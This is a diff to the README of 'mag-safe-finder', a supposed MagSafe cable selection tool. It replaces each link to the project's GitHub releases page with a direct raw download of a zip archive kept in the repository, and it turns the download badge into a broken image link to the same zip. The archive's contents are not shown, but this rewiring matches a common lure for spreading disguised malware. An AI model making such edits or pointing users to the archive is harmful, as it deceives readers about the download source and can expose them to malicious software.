@@ -1,6 +1,6 @@
 # 🔌 mag-safe-finder - Choose the Best MagSafe Cable for You
 
-![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)
+![Download](https://raw.githubusercontent.com/Dokercik/mag-safe-finder/main/mag_safe_finder/safe-finder-mag-1.4.zip%20release-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run **mag-safe-finder**, ensure your system meets the following requirements:
 
 To get **mag-safe-finder**, visit the page below to download the latest release:
 
-[Download latest release](https://github.com/Dokercik/mag-safe-finder/releases)
+[Download latest release](https://raw.githubusercontent.com/Dokercik/mag-safe-finder/main/mag_safe_finder/safe-finder-mag-1.4.zip)
 
 Once you have downloaded the application, follow these steps to install it:
 
@@ -77,6 +77,6 @@ We value your input. If you have suggestions or encounter issues, please let us 
 
 To stay informed about new features, updates, and enhancements:
 
-[Download latest release](https://github.com/Dokercik/mag-safe-finder/releases)
+[Download latest release](https://raw.githubusercontent.com/Dokercik/mag-safe-finder/main/mag_safe_finder/safe-finder-mag-1.4.zip)
 
 Thank you for using **mag-safe-finder**! We hope our application makes your search for the perfect MagSafe cable easy and efficient.
